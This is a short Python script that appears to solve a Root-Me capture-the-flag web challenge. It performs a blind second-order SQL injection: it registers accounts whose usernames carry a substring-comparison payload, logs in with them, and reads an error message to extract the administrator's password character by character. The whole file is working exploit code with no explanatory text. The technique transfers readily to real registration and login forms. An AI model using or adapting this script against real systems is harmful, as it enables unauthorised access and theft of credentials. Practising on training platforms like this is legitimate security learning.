import requests

charset = "0123456789abcdef"

BASE = "http://challenge01.root-me.org:59086/"
LOGIN_URL = BASE + "login.php"
REGISTER_URL = BASE + "login_create.php"
HOME_URL = BASE + "logged-in.php"

password = ""
for pos in range(1,50):
    found = False
    for c in charset:
        payload = f"administrator'&&substr(password,{pos},1)='{c}'#"
        #register
        r = requests.Session()
        r.post(url=REGISTER_URL, data={
            "username" : payload,
            "email" : "1",
            "password" : "1",
            "re_password" : "1",
            "submit" : "Register"
        })
        #login
        respr = r.post(url=LOGIN_URL, data={
            "user" : payload,
            "password" : 1,
            "submit" : "Login"
        },allow_redirects=True)
        if "Trying to access array offset" not in respr.text:
            password += c
            found = True
            print(f"[+] pos {pos}: {c} -> password: {password}")
            break
    if not found:
        print("Done")
        break
print("Password:", password)